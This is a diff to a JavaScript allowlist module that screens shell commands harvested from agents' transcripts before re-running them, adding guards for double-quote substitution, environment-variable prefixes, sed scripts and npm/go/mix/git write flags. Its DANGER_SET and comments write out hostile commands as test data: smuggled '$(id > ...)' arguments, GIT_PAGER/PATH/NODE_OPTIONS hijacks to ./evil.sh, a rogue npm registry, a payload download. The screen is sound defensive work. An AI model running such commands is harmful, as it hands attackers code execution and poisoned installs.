@@ -34,8 +34,18 @@
 //     admits NONE (29/29 vs 0/29 at the time of writing; the test asserts the
 //     RATIO against the live set, not a frozen count, so growing DANGER_SET
 //     cannot make the claim stale);
-//   • over the frozen 651-command corpus, `classifySafety` admits 572 (87.9%)
-//     against this screen's 240 (36.9%).
+//   • over the frozen 651-command corpus, `classifySafety` admits roughly three
+//     times what this screen does — 254 (39.0%) here as of wave 5. Only the
+//     screen's own number is pinned by the suite; the other belongs to
+//     rerun.mjs, so a MARGIN is asserted there and the figure is printed.
+//
+// THE SCREEN'S REACH MOVES, AND THAT IS NOT A REGRESSION. Waves 2-4 held it at
+// exactly 240 because every fix tightened a shape the corpus did not contain.
+// Wave 5 ships tightenings AND widenings together (charter D63) and moved it to
+// 254: +16 from admitting read-only `sed` and from running the host bound after
+// quote masking, −2 from screening environment-assignment prefixes instead of
+// discarding them. Both directions are accounted for member-by-member in
+// screen.test.mjs rather than absorbed into a count.
 //
 // Both are re-derivable in one command: `node tooling/grip/screen.mjs --census`
 // for the second, `node --test tooling/grip/test/screen.test.mjs` for both.
@@ -81,15 +91,35 @@
 // Dependency-free. ESM, node: builtins only. No side effect on import.
 
 // ─────────────────────────────────────────────────────────────────────────────
-// (a) THE HOST BOUND — checked FIRST, on the RAW command
+// (a) THE HOST BOUND — checked FIRST among the substantive layers, on the
+//     QUOTE-MASKED command
 // ─────────────────────────────────────────────────────────────────────────────
 //
-// Deliberately scanned RAW, before any quote-awareness. `grep -n "guerrilla"
-// notes.md` is therefore refused even though the hostname is data there. That
-// is a known, accepted over-refusal: this is the one layer whose failure mode
-// reaches another machine, so it is the one layer that gets no cleverness. The
-// cost is a handful of admissible reads; the alternative is a parser bug
-// standing between a census and production.
+// IT USED TO BE SCANNED RAW, AND THAT WAS WRONG BY MEASUREMENT. The original
+// comment here argued that this is the one layer whose failure mode reaches
+// another machine, so it is the one layer that gets no cleverness, and priced
+// the over-refusal at "a handful of admissible reads". Wave 5 measured the bill
+// instead of estimating it: this wave reads ops docs, and the most quotable line
+// in every one of them contains the word `ssh`, so
+//
+//     cd /x && grep -c "ssh" docs/ops/PROD_OPS.md
+//
+// was refused as REMOTE EXECUTION. A pattern was read as a target. A screen that
+// refuses the honest reads its own operators need does not get made stricter by
+// its users — it gets ROUTED AROUND, and then it bounds nothing at all
+// (charter D63).
+//
+// So the host bound now runs on the MASKED string, one step later, and the
+// ordering is load-bearing: `doubleQuoteExpansionReason` runs BEFORE it and
+// refuses any double-quoted span that sh would expand, so a masked span is a
+// span that provably cannot become a command. Masking is not "cleverness" here
+// once that guarantee holds — it is the difference between reading a hostname
+// and reading the letters h-o-s-t-n-a-m-e.
+//
+// What is REFUSED is unchanged in the direction that matters: `ssh root@host
+// uptime`, `scp`, `rsync`, the two production IPs, guerrilla and barkpark.cloud
+// are all still refused when they appear as SYNTAX. Only their appearance as
+// QUOTED DATA is now admitted.
 
 export const HOST_BOUND = [
   [/\bssh\b/i, "names ssh (remote execution)"],
@@ -127,6 +157,65 @@ export function hostBoundReason(command) {
 // `python3`, `psql`, `awk`, `perl`, `eval`, `xargs`) is absent from the layer-(b)
 // allowlist, so no command whose quoted argument is a program ever reaches a
 // masked scan.
+
+// ─────────────────────────────────────────────────────────────────────────────
+// THE DOUBLE-QUOTE HOLE — masking is only sound for spans sh cannot expand
+// ─────────────────────────────────────────────────────────────────────────────
+//
+// `maskQuotedSpans` blanked double-quoted spans IDENTICALLY to single-quoted
+// ones. For single quotes that is correct — a single-quoted span is inert in
+// every POSIX shell. For double quotes it is FALSE, and the falsehood was an
+// arbitrary-execution primitive on the census's own supposedly fail-closed path:
+//
+//     grep -n "$(id > /tmp/DQ_MARK)" .
+//
+// went through `censusOne` returning screened:true AND executed:true, and wrote
+// /tmp/DQ_MARK carrying live `id` output. Every layer below saw `grep -n QQQQ .`
+// — an ordinary read. sh saw a command substitution and ran it.
+//
+// The fix is NOT to refuse quoting. `grep -n "func handle" x.go` is the single
+// most ordinary read shape there is, and blanket-refusing double quotes would
+// cost most of the census's reach to close a hole with three characters in it.
+// The fix is to scan double-quoted spans for the constructs sh EXPANDS there —
+// `$(…)` and backticks — and refuse only those. Single-quoted `$( )` stays
+// ADMITTED, because it genuinely cannot run.
+//
+// BOUND, stated honestly: this refuses EXECUTION inside double quotes, not
+// EXPANSION. `"$HOME"` and `"${X}"` are still admitted, exactly as bare `$HOME`
+// is admitted outside quotes today — `metacharacterReason` has never caught a
+// plain parameter expansion either. A variable expands to DATA; a substitution
+// expands to the OUTPUT OF A COMMAND THAT RAN. Only the second is this layer's
+// business, and the asymmetry is deliberate rather than an oversight.
+
+/** @returns {string|null} why a double-quoted span would execute, or null */
+export function doubleQuoteExpansionReason(command) {
+  const cmd = String(command ?? "");
+  let quote = null;
+  for (let i = 0; i < cmd.length; i++) {
+    const ch = cmd[i];
+    if (quote === "'") {
+      if (ch === "'") quote = null;
+      continue;
+    }
+    if (quote === '"') {
+      // Inside double quotes, a backslash escapes `$`, `` ` ``, `"` and `\`.
+      if (ch === "\\" && i + 1 < cmd.length) {
+        i++;
+        continue;
+      }
+      if (ch === '"') quote = null;
+      else if (ch === "$" && cmd[i + 1] === "(") {
+        return "command substitution $( ) inside a DOUBLE-quoted span — sh expands it there (only single quotes are inert)";
+      } else if (ch === "`") {
+        return "command substitution with backticks inside a DOUBLE-quoted span — sh expands it there (only single quotes are inert)";
+      }
+      continue;
+    }
+    if (ch === "'" || ch === '"') quote = ch;
+    else if (ch === "\\" && i + 1 < cmd.length) i++;
+  }
+  return null;
+}
 
 export function maskQuotedSpans(command) {
   const cmd = String(command ?? "");
@@ -306,6 +395,12 @@ const gitRule = {
     if ((verb === "branch" || verb === "tag") && hasFlag(argv, ...GIT_WRITE_FLAGS)) {
       return `git ${verb} with a delete/move flag is a write`;
     }
+    // `--output` redirects git's own stdout INTO A FILE, on read verbs this rule
+    // otherwise admits — `git log --output=/tmp/x` and `git log --output /tmp/x`
+    // both create real files. Both spellings, because comparing tokens exactly is
+    // how `--server=` walked past the loopback bound one rule down.
+    const out = argv.find((t, i) => i > 0 && (t === "--output" || /^--output=/.test(t)));
+    if (out) return `git ${out} WRITES git's output to a file rather than stdout`;
     const guard = GIT_SUBVERB_GUARDS.get(verb);
     return guard ? guard(argv) : null;
   },
@@ -496,6 +591,26 @@ const ghRule = {
   },
 };
 
+// go's flags are SINGLE-DASH LONG NAMES that also take `=value`, and the rule
+// compared TOKENS EXACTLY: `hasFlag(argv, "-o", "-exec")`. That is why
+// `go test -c -o /tmp/evil` was already correctly refused (the bare `-o` token
+// is there) while `go test -c` ALONE, and every `-flag=value` profiling flag,
+// sailed straight through. Live-proven writes on the admitted side: `go test -c
+// -o` produced a 4.1MB binary and `-coverprofile=` produced a real file.
+//
+// So the flag NAME is normalised — leading dashes stripped, truncated at `=` —
+// and compared against a set of names. Name equality, not prefix matching: that
+// is what keeps `-cover` (a stdout summary, admitted) distinct from `-c`
+// (compile a test binary to disk, refused) and `-coverprofile=` (a file,
+// refused). Prefix matching would have collapsed all three.
+const GO_WRITE_FLAGS = new Set([
+  "c", "o", "exec",
+  "coverprofile", "cpuprofile", "memprofile", "blockprofile", "mutexprofile", "trace", "outputdir",
+]);
+
+/** `-coverprofile=/tmp/x` → "coverprofile"; `./...` → null. */
+const goFlagName = (t) => (/^--?[^-]/.test(t) ? t.replace(/^-+/, "").split("=")[0] : null);
+
 const goRule = {
   check(argv) {
     const verb = firstNonFlag(argv);
@@ -503,16 +618,71 @@ const goRule = {
     if (verb === null) return "go without a sub-verb";
     if (!allowed.has(verb)) return `go sub-verb "${verb}" is not on the read-only allowlist (${[...allowed].sort().join(", ")})`;
     if (verb === "fmt" && !hasFlag(argv, "-n", "-l")) return "go fmt REWRITES files unless run with -n/-l";
-    if (hasFlag(argv, "-o", "-exec")) return "go -o / -exec writes or runs an arbitrary binary";
+    // `go env -w` / `-u` rewrite the persistent go env file for every later build.
+    if (verb === "env" && hasFlag(argv, "-w", "-u")) return "go env -w/-u REWRITES the persistent go environment file";
+    for (let i = 1; i < argv.length; i++) {
+      const name = goFlagName(argv[i]);
+      if (name && GO_WRITE_FLAGS.has(name)) return `go -${name} writes a file or runs an arbitrary binary`;
+    }
     return null;
   },
 };
+
+// mixRule checked only `verb === "test"` and never looked at a flag, so the two
+// mix test flags that write coverage artefacts to disk were admitted.
+const MIX_TEST_WRITE_FLAGS = ["--cover", "--export-coverage"];
 
 const mixRule = {
   check(argv) {
     const verb = firstNonFlag(argv);
     if (verb === null) return "mix without a task";
     if (verb !== "test") return `mix task "${verb}" is not on the read-only allowlist (only \`mix test\`)`;
+    const bad = argv.find((t) => MIX_TEST_WRITE_FLAGS.some((f) => t === f || t.startsWith(`${f}=`)));
+    if (bad) return `mix test ${bad} WRITES coverage output to disk`;
+    return null;
+  },
+};
+
+// npm was registered as a bare `verbRule`, which reads the TOP-LEVEL verb and
+// stops. `config` and `version` are both on that read-only list and both have
+// WRITING sub-verbs underneath them, so every one of those sub-verbs was
+// admitted by a rule that never looked:
+//
+//   npm config set registry http://evil   writes .npmrc — and repoints every
+//                                         later install at an attacker registry
+//   npm version patch                     writes package.json AND, by npm's own
+//                                         default, git-commits and git-tags it
+//
+// So npm gets a dedicated rule with a second level. Same shape as `ghRule`, and
+// for the same reason: a head whose sub-verb is not the whole story.
+const NPM_READ_VERBS = new Map([
+  ["ls", null],
+  ["view", null],
+  ["info", null],
+  ["outdated", null],
+  ["why", null],
+  ["root", null],
+  ["bin", null],
+  ["config", new Set(["get", "list", "ls"])],
+  // `version` is admitted BARE (it prints versions) and refused with any
+  // positional (that positional is a bump, and a bump is three writes).
+  ["version", null],
+]);
+
+const npmRule = {
+  check(argv) {
+    const verb = firstNonFlag(argv);
+    const names = [...NPM_READ_VERBS.keys()].sort().join(", ");
+    if (verb === null) return `npm without a sub-verb — npm requires one of: ${names}`;
+    if (!NPM_READ_VERBS.has(verb)) return `npm sub-verb "${verb}" is not on the read-only allowlist (${names})`;
+    const after = firstNonFlag(argv, argv.indexOf(verb) + 1);
+    const subs = NPM_READ_VERBS.get(verb);
+    if (subs && after !== null && !subs.has(after)) {
+      return `npm ${verb} sub-verb "${after}" is not read-only (only ${[...subs].sort().join(", ")}) — \`npm config set\` rewrites .npmrc`;
+    }
+    if (verb === "version" && after !== null) {
+      return `npm version ${after} WRITES package.json and, by npm's own default, commits and tags it — only bare \`npm version\` reads`;
+    }
     return null;
   },
 };
@@ -563,7 +733,7 @@ const commandRule = {
 // else.
 //
 // HONEST BOUNDS, both of them:
-//   • LATENT, not live. 0 of the 240 admitted corpus rows use any of these
+//   • LATENT, not live. 0 of the admitted corpus rows use any of these
 //     shapes. It matters because harvest.mjs regenerates the corpus from
 //     arbitrary other agents' transcripts, so today's fixture bounds nothing
 //     about tomorrow's input.
@@ -632,6 +802,185 @@ const cdRule = {
   },
 };
 
+// ── sed: ADMITTED FOR READS, and why that is not a softening ─────────────────
+//
+// `sed` was refused ON THE HEAD, with the true and insufficient reason "its
+// script can write files (`w`) and edit in place (-i)". Measured over this
+// wave's own survey output, that single head rule was the LARGEST refusal class
+// in real foreign text — 7 of 9 refusals — and every one of the seven was a
+// read: `sed -n '40,60p' <file>`, a line citation.
+//
+// The instrument was arguing with itself. The rerun harness's own schema
+// description gives `git show origin/main:path | sed -n 40,60p` as its FIRST
+// worked example of how to write a re-derivation command. The screen refused
+// the exact idiom the harness instructs producers to emit — so the producers
+// were right and the screen was wrong, and a screen that is wrong about the
+// commands its own operators are told to write is a screen that gets routed
+// around (charter D63).
+//
+// WHAT MAKES sed SAFE IS THE SCRIPT, NOT THE HEAD. So the script is PARSED, and
+// admitted only if every clause is a read-only address/print form. The parse is
+// a real scanner rather than a regex because sed's delimiters are user-chosen
+// and its addresses contain arbitrary regexes — `s;a;b;` and `/a;b/p` both carry
+// a `;` that is not a separator, and no honest regex splits those.
+//
+// FAIL-CLOSED IN BOTH PLACES. An unknown script command is REFUSED (not
+// ignored), and an unknown FLAG is REFUSED. That is what keeps this widening
+// from being a hole: `-f script.sed` runs a script FILE this screen never reads,
+// and it is refused for exactly that reason rather than admitted as "just a
+// flag".
+//
+// STANDING BOUNDS, stated rather than discovered later:
+//   • Only `p P = q Q d D n N` and a w-less, e-less `s///` are admitted.
+//     Everything else — `w`, `r`, `e`, `a` `i` `c`, `b`/`t` labels, `{…}`
+//     groups, `y///`, and the `1~3` / `addr,+N` step address forms — is
+//     REFUSED. Several of those are perfectly harmless; they are refused
+//     because the parser does not model them, and a construct the screen cannot
+//     parse is a construct it cannot bound (the same ruling as the unterminated
+//     quote).
+//   • sed still READS whatever file it is pointed at. This module has never
+//     claimed otherwise for `cat`, `grep` or `head` either.
+
+const SED_READ_COMMANDS = new Set(["p", "P", "=", "q", "Q", "d", "D", "n", "N"]);
+const SED_SUBST_FLAGS = /^[gpim0-9]*$/;
+
+/** Scan ONE sed script. @returns {string|null} refusal reason or null */
+export function screenSedScript(script) {
+  const s = String(script ?? "");
+  let i = 0;
+
+  // A `/re/` or `\;re;` address. Advances past it; false on an unterminated one.
+  const readRegexAddress = () => {
+    const delim = s[i] === "\\" ? s[i + 1] : "/";
+    i += s[i] === "\\" ? 2 : 1;
+    while (i < s.length) {
+      if (s[i] === "\\") {
+        i += 2;
+        continue;
+      }
+      if (s[i] === delim) {
+        i++;
+        return true;
+      }
+      i++;
+    }
+    return false;
+  };
+
+  while (i < s.length) {
+    if (/[\s;]/.test(s[i])) {
+      i++;
+      continue;
+    }
+
+    // ADDRESSES — `N`, `$`, `/re/`, optionally as a `A,B` range.
+    for (;;) {
+      if (/\d/.test(s[i])) while (i < s.length && /\d/.test(s[i])) i++;
+      else if (s[i] === "$") i++;
+      else if (s[i] === "/" || s[i] === "\\") {
+        if (!readRegexAddress()) return "sed address regex is unterminated — a script the screen cannot parse is a script it cannot bound";
+      } else break;
+      if (s[i] === ",") {
+        i++;
+        continue;
+      }
+      break;
+    }
+    while (i < s.length && /[\s!]/.test(s[i])) i++;
+    if (i >= s.length) break;
+
+    const cmd = s[i++];
+
+    if (SED_READ_COMMANDS.has(cmd)) {
+      // `q`/`Q` take an optional numeric exit status.
+      while (i < s.length && /[\s\d]/.test(s[i])) i++;
+      continue;
+    }
+
+    if (cmd === "s") {
+      const delim = s[i];
+      if (!delim || /[\s\\\n]/.test(delim)) return "sed s/// with an unparsable delimiter";
+      i++;
+      let closed = 0;
+      while (i < s.length && closed < 2) {
+        if (s[i] === "\\") {
+          i += 2;
+          continue;
+        }
+        if (s[i] === delim) closed++;
+        i++;
+      }
+      if (closed < 2) return "sed s/// is unterminated";
+      const from = i;
+      while (i < s.length && /[A-Za-z0-9]/.test(s[i])) i++;
+      const flags = s.slice(from, i);
+      if (flags.includes("w")) return "sed s///w WRITES its replacement result to a file";
+      if (flags.includes("e")) return "sed s///e EXECUTES its replacement result as a shell command";
+      if (!SED_SUBST_FLAGS.test(flags)) return `sed s/// flag "${flags}" is not on the read-only allowlist (g, p, i, m and a count)`;
+      continue;
+    }
+
+    if (cmd === "w" || cmd === "W") return "sed's `w` script command WRITES the pattern space to a file";
+    if (cmd === "e") return "sed's `e` script command EXECUTES a shell command";
+    if (cmd === "r" || cmd === "R") return "sed's `r` script command reads a file the screen never sees";
+    return `sed script command "${cmd}" is not a read-only address/print form (only ${[...SED_READ_COMMANDS].join(" ")} and a w-less s///)`;
+  }
+  return null;
+}
+
+const SED_READ_FLAGS = new Set([
+  "-n", "-E", "-r", "-s", "-u", "-z", "-a", "-l",
+  "--quiet", "--silent", "--regexp-extended", "--separate", "--unbuffered", "--null-data", "--posix", "--debug", "--sandbox",
+]);
+
+// `-i` takes an OPTIONAL attached suffix (`-i.bak`) and clusters (`-ni`), which
+// is exactly the shape `normaliseArgv` exists to flatten — the same normaliser
+// that closed `curl -so/tmp/x`, rather than a sixth hand-copy of the grammar.
+const SED_VALUE_LETTERS = new Set(["e", "f", "i", "l"]);
+
+const sedRule = {
+  check(rawArgv) {
+    const argv = normaliseArgv(rawArgv, SED_VALUE_LETTERS);
+    const scripts = [];
+    let sawExpression = false;
+    for (let i = 1; i < argv.length; i++) {
+      const t = argv[i];
+      if (t === "--") {
+        // Only the FIRST bare positional is a script, and only when nothing has
+        // supplied one yet. Taking `rest[0]` unconditionally made
+        // `sed '1p' -- notes.md` screen the FILENAME as a script and refuse it
+        // ("script command \"o\"") — a false refusal found by probing the
+        // separator after the rule was otherwise green.
+        const rest = argv.slice(i + 1);
+        if (!sawExpression && scripts.length === 0 && rest.length) scripts.push(rest[0]);
+        break;
+      }
+      if (t === "-i" || t === "--in-place" || /^--in-place=/.test(t)) return "sed -i EDITS ITS INPUT FILES IN PLACE";
+      if (t === "-f" || t === "--file") return "sed -f runs a script FILE the screen never sees";
+      if (t === "-e" || t === "--expression") {
+        const v = arg(argv, i + 1);
+        if (v === null) return "sed -e without a script";
+        scripts.push(v);
+        sawExpression = true;
+        i++;
+        continue;
+      }
+      if (t.startsWith("-") && t.length > 1) {
+        if (!SED_READ_FLAGS.has(t)) return `sed flag "${t}" is not on the read-only allowlist (${[...SED_READ_FLAGS].sort().join(", ")})`;
+        continue;
+      }
+      // The first bare positional is the script, unless -e already supplied one.
+      if (!sawExpression && scripts.length === 0) scripts.push(t);
+    }
+    if (!scripts.length) return "sed without a script";
+    for (const script of scripts) {
+      const why = screenSedScript(script);
+      if (why) return why;
+    }
+    return null;
+  },
+};
+
 /**
  * THE ALLOWLIST. Every entry is a head this census may run. Anything absent is
  * REFUSED — that is the fail-closed property, and it is why this is a Map of
@@ -675,6 +1024,7 @@ export const ALLOWED_HEADS = new Map([
   ["nl", plainRule()],
   ["comm", plainRule()],
   ["diff", plainRule()],
+  ["sed", sedRule],
   ["jq", plainRule()],
   ["column", plainRule()],
   ["rev", plainRule()],
@@ -686,7 +1036,11 @@ export const ALLOWED_HEADS = new Map([
   // `date -s`/`--set` SETS the system clock. A census that re-runs history must
   // never be able to move the clock the ledger's own now-bound compares against.
   ["date", { check: (argv) => (hasFlag(argv, "-s", "--set") || argv.some((t) => /^--set=/.test(t)) ? "date -s SETS the system clock" : null) }],
-  ["hostname", plainRule()],
+  // `hostname` was a bare `plainRule()` with zero argument check, so
+  // `hostname evil-name` was admitted — and a positional is not an option to
+  // hostname, it is the NEW HOSTNAME. Bare `hostname` (and its read flags
+  // `-f`/`-s`/`-i`) still print.
+  ["hostname", { check: (argv) => (firstNonFlag(argv) !== null ? `hostname ${firstNonFlag(argv)} SETS the system hostname — only bare \`hostname\` reads` : null) }],
   ["id", plainRule()],
   ["whoami", plainRule()],
   ["env", { check: (argv) => (argv.length > 1 ? "env with arguments runs a command" : null) }],
@@ -719,7 +1073,7 @@ export const ALLOWED_HEADS = new Map([
   // sort/uniq/tree hole, same root cause — a verb judged by "does it execute
   // something?" rather than "does it write?". Removing it costs the census
   // nothing: 0 of the 651 frozen corpus commands use it.
-  ["npm", verbRule(["ls", "view", "info", "outdated", "why", "version", "config", "root", "bin"], "npm")],
+  ["npm", npmRule],
   ["pnpm", verbRule(["ls", "view", "info", "outdated", "why", "list", "root", "bin"], "pnpm")],
 ]);
 
@@ -748,7 +1102,11 @@ export const REFUSED_HEADS = new Map([
   ["iex", "iex executes arbitrary code"],
   ["erl", "erl executes arbitrary code"],
   ["awk", "awk can shell out via system()"],
-  ["sed", "sed is a stream editor — its script can write files (`w`) and edit in place (-i)"],
+  // `sed` LEFT this map in wave 5. It is now judged on its SCRIPT by `sedRule`
+  // rather than on its head — see the block above `screenSedScript`. The head
+  // rule was refusing the single most common honest read shape in real foreign
+  // output, including the one the rerun harness's own schema tells producers to
+  // write. `sed -i`, `w`, `e` and `s///w` are still refused, by the parser.
   ["xargs", "xargs executes a command per input line"],
   ["npx", "npx installs and then executes an arbitrary package (settled ruling)"],
   ["psql", "psql executes arbitrary SQL"],
@@ -793,7 +1151,75 @@ export const REFUSED_HEADS = new Map([
   ["export", "an environment assignment is not a command this census can re-derive a fact from"],
 ]);
 
-const ENV_ASSIGNMENT = /^[A-Za-z_][A-Za-z0-9_]*=\S*(\s+|$)/;
+// ─────────────────────────────────────────────────────────────────────────────
+// THE ENVIRONMENT-ASSIGNMENT PREFIX — SCREENED, never silently discarded
+// ─────────────────────────────────────────────────────────────────────────────
+//
+// `screenSegment` matched this prefix, STRIPPED it, and never looked at it
+// again. That was a GENERAL remote-execution primitive, and — this is the part
+// that matters — it sat BELOW every head rule, so no amount of tightening
+// `gitRule`, `ghRule` or `goRule` could ever reach it. All four of these were
+// ADMITTED and, when run, executed attacker-controlled code:
+//
+//   GIT_EXTERNAL_DIFF=./evil.sh git diff HEAD~1        git RUNS ./evil.sh
+//   GIT_PAGER=./evil.sh git log -1                     git RUNS ./evil.sh
+//   PAGER=./evil.sh gh pr view 1                       gh  RUNS ./evil.sh
+//   NODE_OPTIONS=--require=./evil.cjs node --test x    node RUNS attacker JS
+//
+// The head allowlist is the module's central claim; an assignment that changes
+// WHICH PROGRAM the allowlisted head runs voids it entirely. So the name is
+// screened against an ALLOWLIST, which is the same fail-closed discipline the
+// head list gets, and for the same reason: the set of environment variables that
+// redirect execution is unbounded and undocumentable — `GIT_*` alone has a dozen
+// (`GIT_SSH`, `GIT_SSH_COMMAND`, `GIT_EDITOR`, `GIT_SEQUENCE_EDITOR`,
+// `GIT_ASKPASS`, `GIT_PROXY_COMMAND`, `GIT_DIR`, `GIT_CONFIG_GLOBAL`, …) — while
+// the set that is inert and actually appears in real work is tiny.
+//
+// THE LIST WAS DERIVED FROM THE CORPUS, NOT INVENTED. Exactly three names appear
+// across the 28 environment-prefixed rows the screen admits today: `CC`,
+// `MIX_ENV`, `MIX_TEST_PARTITION`. `CXX` and `MIX_TARGET` are included as the
+// obvious siblings of two of them.
+//
+// `PATH` IS DELIBERATELY ABSENT, AND IT COSTS ONE ADMITTED ROW. The corpus row
+//
+//   CC=/usr/bin/clang MIX_TEST_PARTITION=felixv3 PATH="$FB:$PATH" mix test …:583
+//
+// is admitted today and is refused from here on. That is the correct trade and
+// not a regret: `PATH=` decides which binary EVERY later token resolves to, so
+// admitting it makes the head allowlist decorative — `PATH=/tmp/evil git log`
+// runs /tmp/evil/git. One honest row is a fair price for the layer's central
+// claim, and the row is named here rather than quietly absorbed into a count.
+//
+// CC IS ON THE LIST AND ITS VALUE IS STILL BOUNDED, because `CC` names a program
+// that cgo genuinely executes during `go test`. `CC=clang` and
+// `CC=/usr/bin/clang` (the two spellings the corpus uses) are admitted;
+// `CC=./evil.sh` is not.
+const ENV_INERT_NAMES = new Set(["MIX_ENV", "MIX_TARGET", "MIX_TEST_PARTITION", "CC", "CXX"]);
+
+// Names whose VALUE is executed, so the value must be a bare program name or an
+// absolute path — never a relative script beside the checkout.
+const ENV_PROGRAM_NAMES = new Set(["CC", "CXX"]);
+const ENV_PROGRAM_VALUE = /^(\/[\w.+-]+)+$|^[\w.+-]+$/;
+
+const ENV_ASSIGNMENT = /^([A-Za-z_][A-Za-z0-9_]*)=(\S*)(\s+|$)/;
+
+/** @returns {string|null} why an `NAME=value` prefix is refused, or null */
+export function envAssignmentReason(name, value) {
+  if (!ENV_INERT_NAMES.has(name)) {
+    return `environment assignment "${name}=" is not on the inert allowlist (${[...ENV_INERT_NAMES].sort().join(", ")}) — a prefix like GIT_EXTERNAL_DIFF=, GIT_PAGER=, PAGER=, NODE_OPTIONS= or PATH= changes WHICH PROGRAM the allowlisted head runs, which voids the head allowlist entirely`;
+  }
+  if (/[$`]/.test(value)) return `environment value "${name}=${value}" expands at run time — the screen cannot bound what it becomes`;
+  // A value the author QUOTED is the same value. `CC="/usr/bin/clang"` is the
+  // identical assignment as `CC=/usr/bin/clang`, and refusing the first was a
+  // false refusal of the exact class D63 exists to close — the quotes are
+  // stripped for the shape test, never for the expansion test above, which
+  // must keep seeing the raw span.
+  const bare = /^(["'])(.*)\1$/.test(value) ? value.slice(1, -1) : value;
+  if (ENV_PROGRAM_NAMES.has(name) && !ENV_PROGRAM_VALUE.test(bare)) {
+    return `${name}=${value} names a PROGRAM the toolchain executes; only a bare name or an absolute path is admitted (not a relative script)`;
+  }
+  return null;
+}
 
 /** Screen ONE pipeline segment. @returns {string|null} refusal reason or null */
 export function screenSegment(segment) {
@@ -802,9 +1228,12 @@ export function screenSegment(segment) {
 
   // `MIX_ENV=test mix test …` — the assignment is a prefix, not the command.
   // Stripping is what makes `MIX_ENV=test mix ecto.drop` reach the mix rule
-  // rather than sail past a head check that saw `MIX_ENV=test`.
-  while (ENV_ASSIGNMENT.test(s)) {
-    const m = s.match(ENV_ASSIGNMENT);
+  // rather than sail past a head check that saw `MIX_ENV=test`. Every prefix is
+  // SCREENED before it is stripped; see the block above.
+  let m;
+  while ((m = s.match(ENV_ASSIGNMENT))) {
+    const why = envAssignmentReason(m[1], m[2]);
+    if (why) return `not allowlisted: ${why}`;
     s = s.slice(m[0].length).trim();
     if (!s) return "not allowlisted: a bare environment assignment is not a command";
   }
@@ -887,6 +1316,20 @@ export const WRITE_SHAPES = [
   [/--write\b/, "--write"],
   [/--fix\b/, "--fix"],
   [/--in-place\b/, "--in-place"],
+  // ── wave 5. The four heads whose rule MISSED a write flag get the same
+  // shared-predicate backstop as the three text tools above, and inherit the
+  // same stated bound: this catches a head dropped from ALLOWED_HEADS or
+  // re-registered as `plainRule()`, not a bug INSIDE the rule.
+  //
+  // They sit LAST on purpose. Firing on `rule.check(argv) !== null` means these
+  // fire on ANY refusal the rule can produce, not only a write — so a more
+  // specific entry above (`git write verb`, `mix write task`, `package
+  // mutation`) must win the reason, and the label here is worded to stay honest
+  // for whatever is left.
+  [headWritesFile("go", goRule), "the go rule refuses this segment (a -c/-o/-exec/-*profile write flag, or a non-read sub-verb)"],
+  [headWritesFile("npm", npmRule), "the npm rule refuses this segment (`npm config set` / `npm version <bump>`, or a non-read sub-verb)"],
+  [headWritesFile("mix", mixRule), "the mix rule refuses this segment (`--cover`/`--export-coverage`, or a task other than `test`)"],
+  [headWritesFile("sed", sedRule), "the sed rule refuses this segment (`-i`, a `w` script command, `s///w`, or an unparsable script)"],
 ];
 
 /**
@@ -917,12 +1360,21 @@ export function screenCommand(cmd) {
   const raw = String(cmd ?? "").trim();
   if (!raw) return refuse("empty command");
 
-  // (a) HOST BOUND — first, cheapest, on the RAW string.
-  const host = hostBoundReason(raw);
-  if (host) return refuse(`host bound: ${host}`);
+  // QUOTE MASKING, and the guard that makes it SOUND. Every layer below reads
+  // the masked string, so masking must not be able to hide a command: a
+  // double-quoted span sh would EXPAND is refused here, before anything trusts a
+  // blanked span. Wave 5 shipped this after `grep -n "$(id > /tmp/DQ_MARK)" .`
+  // ran through `censusOne` and wrote the marker.
+  const expands = doubleQuoteExpansionReason(raw);
+  if (expands) return refuse(`shell metacharacter: ${expands}`);
 
   const masked = maskQuotedSpans(raw);
   if (masked === null) return refuse("unparsable: unterminated quote — a command the screen cannot parse is a command it cannot bound");
+
+  // (a) HOST BOUND — first of the substantive layers, over the MASKED string so
+  // a hostname QUOTED AS DATA is data. Sound only because of the guard above.
+  const host = hostBoundReason(masked);
+  if (host) return refuse(`host bound: ${host}`);
 
   // (b) METACHARACTERS, then the ALLOWLIST over every pipeline segment.
   const meta = metacharacterReason(masked);
@@ -1032,6 +1484,40 @@ export const DANGER_SET = [
   // cluster pattern could not see this one, so D29's named danger stayed open in
   // a third spelling.
   "curl -s https://example.com/payload.sh -so/opt/barkpark/deploy/site-deploy.sh",
+  // ── wave 5. THE TWO UPSTREAM PRIMITIVES. Both were admitted by the shipped
+  // screen and both were live-proven to EXECUTE: the first through `censusOne`
+  // itself, which returned screened:true/executed:true and wrote /tmp/DQ_MARK
+  // carrying real `id` output. They sit ABOVE and BELOW the head allowlist
+  // respectively, which is why no head-rule tightening in four waves reached
+  // either of them.
+  'grep -n "$(id > /tmp/DQ_MARK)" .',
+  'grep -n "`id > /tmp/DQ_MARK`" .',
+  "GIT_EXTERNAL_DIFF=./evil.sh git diff HEAD~1",
+  "GIT_PAGER=./evil.sh git log -1",
+  "PAGER=./evil.sh gh pr view 1",
+  "NODE_OPTIONS=--require=./evil.cjs node --test ok.test.mjs",
+  "PATH=/tmp/evil:$PATH git log -1",
+  "CC=./evil.sh go test ./...",
+  // ── wave 5. The four write-flag holes: heads that HAVE a rule which missed a
+  // flag. Zero corpus reach at today's volume; the fix matters once the ledger
+  // stores commands faster than anyone reads them.
+  "git log --output=/tmp/evil.txt",
+  "git log --output /tmp/evil.txt",
+  "npm config set registry http://evil",
+  "npm version patch",
+  "mix test --cover",
+  "mix test --export-coverage=/tmp/evil",
+  "go test -c",
+  "go test -coverprofile=/tmp/evil.out ./...",
+  "go test -cpuprofile=/tmp/evil.out ./...",
+  "go env -w GOFLAGS=-mod=mod",
+  "hostname evil-name",
+  // ── wave 5. sed is ADMITTED for reads now, so its write forms are named here.
+  "sed -i 's/a/b/' api/lib/barkpark/application.ex",
+  "sed -i.bak 's/a/b/' api/lib/barkpark/application.ex",
+  "sed -n 'w /opt/barkpark/deploy/site-deploy.sh' notes.md",
+  "sed 's/x/y/w /opt/barkpark/deploy/site-deploy.sh' notes.md",
+  "sed -f /tmp/evil.sed notes.md",
 ];
 
 /** Must stay ADMITTED. Refusing these is the gate punishing honest work. */
@@ -1056,6 +1542,35 @@ export const NEVER_CRY_WOLF_SET = [
   "uniq -f 2 /tmp/lines.txt",
   "tree docs/",
   "tree -L 2 -I node_modules docs/",
+  // ── wave 5. THE WIDENINGS. Each of these was REFUSED by the shipped screen
+  // and each is an honest read, so each belongs in the cry-wolf set rather than
+  // only in the test file: if one of them ever refuses again, the screen has
+  // resumed the behaviour that gets it routed around.
+  //
